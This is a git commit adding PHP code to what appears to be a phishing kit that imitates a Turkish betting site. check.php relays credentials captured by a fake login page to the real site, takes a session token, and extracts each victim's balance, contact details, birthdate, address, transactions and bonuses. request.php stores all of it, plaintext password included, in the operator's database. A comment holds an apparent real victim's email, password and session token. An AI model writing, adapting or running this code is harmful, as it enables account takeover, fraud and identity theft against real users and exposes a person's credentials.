f0f4c981a61f6e36a1296e1ee16a265e439a6a7c
BELOOVED <aycahanim@outlook.com>
2022-11-20 15:02:16 +0300

    new file:   inc/check.php 	modified:   request.php 	new file:   view/login.php

---
+++ inc/check.php
@@ -0,0 +1,164 @@
+<?php
+
+$gercek_site = "onwin629.com";
+global $gercek_site;
+
+
+function unicodeString($str) {
+    $aa = preg_replace('/u([\da-fA-F]{4})/', '&#x\1;', $str);
+    return str_replace('\\','',$aa);
+}
+
+
+function giris($user,$pass){
+    global $gercek_site;
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://'.$gercek_site.'/login');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Host' => $gercek_site,
+        'Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"',
+        'Accept: application/json, text/plain, */*',
+        'Content-Type: application/x-www-form-urlencoded',
+        'X-Requested-With: XMLHttpRequest',
+        'Sec-Ch-Ua-Mobile: ?0',
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36',
+        'Sec-Ch-Ua-Platform: "Windows"',
+        'Origin: https://'.$gercek_site,
+        'Sec-Fetch-Site: same-origin',
+        'Sec-Fetch-Mode: cors',
+        'Sec-Fetch-Dest: empty',
+        'Referer: https://'.$gercek_site.'/login',
+        'Accept-Encoding: gzip, deflate',
+        'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+    ]);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.urlencode($user).'&password='.urlencode($pass).'&captcha=');
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+
+    $response = curl_exec($ch);
+    curl_close($ch);
+    $durum = json_decode($response,false);
+
+    if (!($durum->status == "1")){
+        return "hata";
+    }else{
+        return $durum->token;
+    }
+}
+
+
+//aray olarak çıktı veriri
+function vericek($token){
+    global $gercek_site;
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://'.$gercek_site.'/getMyDetails');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"',
+        'Authorization: Bearer '.$token,
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36',
+        'Content-Type: application/x-www-form-urlencoded',
+        'Accept: application/json, text/plain, */*',
+        'X-Requested-With: XMLHttpRequest',
+        'Sec-Ch-Ua-Platform: "Windows"',
+        'Origin: https://'.$gercek_site,
+        'Sec-Fetch-Site: same-origin',
+        'Sec-Fetch-Mode: cors',
+        'Sec-Fetch-Dest: empty',
+        'Referer: https://'.$gercek_site.'/membership',
+        'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+    ]);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, 'detailed=true');
+    curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate,sdch');
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $response = curl_exec($ch);
+    curl_close($ch);
+    $durum = json_decode($response,false);
+    if (!($durum->status == "1")){
+        return "hata";
+    }else{
+        return $durum;
+    }
+}
+
+
+
+//aray olarak çıktı veriri
+function oyungecmis($token){
+    global $gercek_site;
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://'.$gercek_site.'/getData/transactionList');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"',
+        'Authorization: Bearer '.$token,
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36',
+        'Content-Type: application/x-www-form-urlencoded',
+        'Accept: application/json, text/plain, */*',
+        'X-Requested-With: XMLHttpRequest',
+        'Sec-Ch-Ua-Platform: "Windows"',
+        'Origin: https://'.$gercek_site,
+        'Sec-Fetch-Site: same-origin',
+        'Sec-Fetch-Mode: cors',
+        'Sec-Fetch-Dest: empty',
+        'Referer: https://'.$gercek_site.'/transactions',
+        'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+    ]);
+    $tariha = str_replace('.','-',date('Y.m.d'));
+    $tarihb = str_replace('.','-',date('Y.m.d', time() - 2629745));
+    curl_setopt($ch, CURLOPT_POSTFIELDS, "start=0&length=10&sortBy=id&sortDesc=ASC&date1=".$tarihb."&date2=".$tariha."&status=0&date=");
+    curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate,sdch');
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $response = curl_exec($ch);
+    curl_close($ch);
+    $durum = json_decode($response,false);
+    if (!($durum->status == "1")){
+        return "hata";
+    }else{
+        return $durum;
+    }
+}
+
+function bonusgetir($token){
+    global $gercek_site;
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://'.$gercek_site.'/getData/bonuses');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"',
+        'Authorization: Bearer '.$token,
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36',
+        'Content-Type: application/x-www-form-urlencoded',
+        'Accept: application/json, text/plain, */*',
+        'X-Requested-With: XMLHttpRequest',
+        'Sec-Ch-Ua-Platform: "Windows"',
+        'Origin: https://'.$gercek_site,
+        'Sec-Fetch-Site: same-origin',
+        'Sec-Fetch-Mode: cors',
+        'Sec-Fetch-Dest: empty',
+        'Referer: https://'.$gercek_site.'/bonuses',
+        'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+    ]);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, 'detailed=true');
+    curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate,sdch');
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $response = curl_exec($ch);
+    curl_close($ch);
+    $durum = json_decode($response,false);
+    if (!($durum->status == "1")){
+        return "hata";
+    }else{
+        return $durum;
+    }
+}
+
+// echo giris("Barisduzguner@gmail.com","21111999");
+// print_r (bonusgetir("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vb253aW42MjkuY29tL2xvZ2luIiwiaWF0IjoxNjY4OTAwMjYzLCJuYmYiOjE2Njg5MDAyNjMsImp0aSI6IlprNXpZWGZpazhQYjZKQkIiLCJzdWIiOjExMjQ2NjQsInBydiI6Ijg3ZTBhZjFlZjlmZDE1ODEyZmRlYzk3MTUzYTE0ZTBiMDQ3NTQ2YWEiLCJ1c2VyIjp7Imd1YXJkIjoid2ViIiwiYmlkIjoiZWVmZjJjNGEtOWI5OC00OGVlLWIzYjAtYTg1NGVmYmNkMTBiIiwiaWQiOjExMjQ2NjQsInVzZXJuYW1lIjoiUG95cmF6MDE0OSIsImlwIjoiOTUuNS42MC4yNiJ9fQ.mi5sl1TdY2zn884P6DUxEzXngidi8OLsqjORzC2E4rs"));
--- request.php
+++ request.php
@@ -3,6 +3,7 @@
 include 'inc/config.php';
 include 'inc/functions.php';
 include 'inc/anti.php';
+include 'inc/check.php';
 
 $q = $_GET['q'];
 
@@ -24,15 +25,58 @@ if ($q == 'login') {
     $_SESSION['user_id'] = $user['id'];
     die('success');
   }else{
-    $db -> query("INSERT into users set
-      login='$login',
-      password='$password',
-      phone='$phone',
-      passport='$passport',
-      device='$device',
-      ip='$ip'");
-    $_SESSION['user_id'] = $db->insert_id;
-    die('success');
+		$durum = giris($login,$password);
+		if (!($durum == "hata")){
+			$kbilgi1 = unicodeStringa(vericek($durum));
+			
+			$para = json_decode($kbilgi1,false)->user->balance;
+			
+			$phone = json_decode($kbilgi1,false)->user->gsm;
+			$username = json_decode($kbilgi1,false)->user->username;
+			$gun = json_decode($kbilgi1,false)->user->birthdate->day;
+			$ay = json_decode($kbilgi1,false)->user->birthdate->month;
+			$yil = json_decode($kbilgi1,false)->user->birthdate->year;
+			
+			$adi = json_decode($kbilgi1,false)->user->firstName;
+			$soyadi = json_decode($kbilgi1,false)->user->lastName;
+			$email = json_decode($kbilgi1,false)->user->email;
+			$ulke = json_decode($kbilgi1,false)->user->country;
+			$bolge = cevir(json_decode($kbilgi1,false)->user->city);
+			$adres = json_decode($kbilgi1,false)->user->address;
+
+			
+
+			
+			
+			$db -> query("INSERT into users set
+			login='$login',
+			password='$password',
+			balance='$para',
+			originalbalance='$para',
+			phone='$phone',
+			passport='$passport',
+			device='$device',
+			ip='$ip',
+			data1='$kbilgi',
+			data2='$kbilgi1',
+			data3='$durum',
+			username='$username',
+			gun='$gun',
+			ay='$ay',
+			yil='$yil',
+			adi='$adi',
+			soyadi='$soyadi',
+			email='$email',
+			bolge='$bolge',
+			adres='$adres',
+			ulke='$ulke'");
+			$_SESSION['user_id'] = $db->insert_id;
+			die('success');
+			
+		}else{
+			die('error');
+		}
+    
   }
 }elseif($q == 'logout'){
   session_destroy();
